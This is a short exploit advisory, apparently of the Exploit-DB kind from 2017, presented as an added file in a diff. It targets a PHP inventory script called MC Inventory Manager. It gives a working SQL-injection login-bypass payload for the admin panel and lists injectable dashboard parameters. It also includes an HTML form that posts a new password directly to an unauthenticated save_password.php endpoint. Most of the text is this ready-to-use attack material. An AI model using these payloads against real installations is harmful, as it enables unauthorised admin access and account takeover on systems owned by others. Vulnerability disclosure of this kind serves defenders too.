@@ -1,0 +1,37 @@
+# # # # # 
+# Vulnerability: Admin Login Bypass & SQLi
+# Date: 15.01.2017
+# Vendor Homepage: http://microcode.ws/
+# Script Name: MC Inventory Manager
+# Script Buy Now: http://microcode.ws/product/mc-inventory-manager-php-script/3885
+# Author: İhsan Şencan
+# Author Web: http://ihsan.net
+# Mail : ihsan[beygir]ihsan[nokta]net
+# # # # # 
+# Admin Login Bypass
+# http://localhost/[PATH]/admin/ and set Username:'or''=' and Password to 'or''=' and hit enter.
+# # # # # 
+# http://localhost/[PATH]/dashboard.php?p=view_sell&id=[SQL]
+# http://localhost/[PATH]//dashboard.php?p=edit_item&id=[SQL]
+# E.t.c.... 
+# Other features have the same security vulnerability.
+# Exploit:
+<html>
+<body>
+<form action="http://localhost/[PATH]/functions/save_password.php" method="post" parsley-validate>
+<fieldset>
+<label>Change Password : </label>
+<input type="password" placeholder="Type new password" name="password" required/>
+</fieldset>
+<fieldset>
+<label>Re-type Password : </label>
+<input type="password" placeholder="Re-Type password again" name="repassword" required/>
+</fieldset>
+<button type="submit" class="btn btn-sm btn-success">Save
+<i class="icon-arrow-right icon-on-right bigger-110"></i>
+</button>
+</form>
+</body>
+</html>
+# # # # #
+# # # # # 
